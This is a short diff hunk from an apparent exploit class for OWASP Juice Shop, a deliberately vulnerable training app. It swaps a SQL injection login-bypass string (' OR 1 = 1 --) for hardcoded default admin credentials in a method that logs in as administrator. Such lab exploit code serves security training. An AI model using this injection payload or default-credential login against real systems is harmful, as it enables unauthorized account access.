@@ -41,7 +41,7 @@ class JuiceShopCouponExploit:
         self.session = requests.Session()
         self.headers = {"Content-Type": "application/json"}
 
-    def login_as_admin(self, email="' OR 1 = 1 --", password="password"):
+    def login_as_admin(self, email="admin@juice-sh.op", password="admin123"):
         payload = {"email": email, "password": password}
         response = self.session.post(f"{self.base_url}/rest/user/login", json=payload, headers=self.headers)
         if response.status_code == 200 and "authentication" in response.json():
